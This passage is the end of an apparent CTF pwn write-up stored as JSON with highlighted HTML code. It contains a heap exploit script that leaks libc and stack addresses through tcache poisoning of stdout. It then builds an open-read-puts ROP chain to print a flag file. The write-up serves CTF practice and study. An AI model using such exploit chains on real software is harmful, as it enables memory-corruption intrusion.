punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>stdout <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdout_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>stack_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x128</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>dele_<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>stack_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>pop_rdi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000023b6a</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>pop_rsi_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x000000000002601f</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>pop_rdx_ret <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x0000000000142c92</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>open_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>read_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>write_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>sendfile_addr <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'sendfile'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>puts <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>flag_addr <span class=\"token operator\">=</span> stack_addr</pre></td></tr><tr><td data-num=\"121\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'./flag\\x00\\x00'</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre><span class=\"token comment\"># open('./flag', 0)</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>flag_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>open_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token comment\"># read(3, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rsi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>pop_rdx_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token comment\"># write(1, stack_addr - 0x200, 0x50)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(stack_addr - 0x200) + p64(pop_rdx_ret) + p64(0x50) + p64(write_addr)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token comment\"># payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0) + p64(sendfile_addr)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>add_<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "堆拓展攻击",
                "orw",
                "堆栈结合"
            ]
        }
    ]
}